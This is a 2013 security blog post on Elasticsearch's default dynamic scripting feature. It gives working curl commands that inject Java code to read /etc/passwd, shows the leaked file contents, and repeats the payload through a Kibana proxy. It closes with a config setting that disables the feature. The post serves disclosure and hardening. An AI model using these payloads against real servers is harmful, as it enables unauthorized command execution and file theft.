---
date: "2013-11-30 20:33:00 GMT"
slug: "elasticsearch-command-execution-using-script"
tumblr_post_url: "http://blog.liftsecurity.io/post/68592779657/elasticsearch-command-execution-using-script"
tags: 
  - elasticsearch
  - feature
  - command execution
  - script
title: "Elasticsearch Command Execution using \"script\""
type: text
---
In the process of trying to full text index all of the source code from node modules within npm for the Node Security Project, I encountered a feature of Elasticsearch that I couldn't stay away from playing with: scripting.  
  
Sometimes the most innocent of features can create a vulnerability. Scripting is enabled by default in Elasticsearch and if left bound to a public interface allows for easy system command execution.  
  
**Elasticsearch**  
  
Here is a simple example to read /etc/passwd  
  

> \# Create a document  
> curl -XPUT :9200/blog/article/1/ -d '{"foo":"bar"}'
> 
>   
> \# Update it running the provided script. It puts the file contents in the content field.
> 
>   
> curl -XPOST :9200/blog/article/1/\_update -d '{"script": "ctx.\_source.content = 1;import java.util.\*;import java.io.\*;String content=new Scanner(new File("/etc/passwd")).useDelimiter("\\\\Z").next();ctx.\_source.content=content"}'  
>   
> \# Now get the content  
> curl :9200/blog/article/1/  
>   
> \# Result  
> {  
> "\_index" : "blog",  
> "\_type" : "article",  
> "\_id" : "2",  
> "\_version" : 2,  
> "exists" : true, "\_source" : {"content":"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\nbin:x:2:2:bin:/bin:/bin/sh\\nsys:x:3:3:sys:/dev:/bin/sh\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/bin/sh\\nman:x:6:12:man:/var/cache/man:/bin/sh\\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\\nmail:x:8:8:mail:/var/mail:/bin/sh\\nnews:x:9:9:news:/var/spool/news:/bin/sh\\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\\nproxy:x:13:13:proxy:/bin:/bin/sh\\nwww-data:x:33:33:www-data:/var/www:/bin/sh\\nbackup:x:34:34:backup:/var/backups:/bin/sh\\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\\nsyslog:x:101:103::/home/syslog:/bin/false\\nmessagebus:x:102:105::/var/run/dbus:/bin/false\\nlandscape:x:103:108::/var/lib/landscape:/bin/false\\nsshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin\\nwhoopsie:x:105:109::/nonexistent:/bin/false\\nelasticsearch:x:106:113::/usr/share/elasticsearch:/bin/false\\nntp:x:107:114::/home/ntp:/bin/false"}  
> }
> 

  
**Kibana**  
Sometimes Elasticsearch is hidden behind the veil of another service like Kibana. It's still possible to get execution using Kibana, as it essentially proxies our queries straight into Elasticsearch.

> curl 'http://kibana.example.net/logstash-2013.11.11/\_search' -X POST -H 'Authorization: Basic eWV0aXM6em9vbXpvb21idXR0ZXI=' -H 'Host: kibana.example.net' -d @script\_kibana
> 

  
_Contents of @script\_kibana_

> {"query":{"filtered":{"query":{"bool":{"should":\[{"query\_string":{"query":"\*"}}\]}},"filter":{"bool":{"must":\[{"match\_all":{}},{"range":{"@timestamp":{"from":1384193353299,"to":1384196953300}}},{"bool":{"must":\[{"match\_all":{}}\]}}\]}}}},"highlight":{"fields":{},"fragment\_size":2147483647,"pre\_tags":\["@start-highlight@"\],"post\_tags":\["@end-highlight@"\]},"size":1,"sort":\[{"@timestamp":{"order":"desc"}}\],"script\_fields": {"uid\_in\_script": **{"script": "import java.util.\*;import java.io.\*;String content = new Scanner(new File("/etc/passwd")).useDelimiter("\\\\Z").next();return content;"}**}}
> 

  
  
**Avoid having somebody run commands on your Elasticsearch servers**  
  
You can disable this feature by adding the following to your Elasticsearch config file, then restarting the service. Keep in mind that you will want to disable this on all the nodes in your cluster.

> script.disable\_dynamic: true
> 

  
Of course if you need to have scripting enabled and don't have your nodes exposed to the outside world I would just recommend that you build your elastisearch payloads very methodically not letting the user specify specifics that end up in the query / update payloads.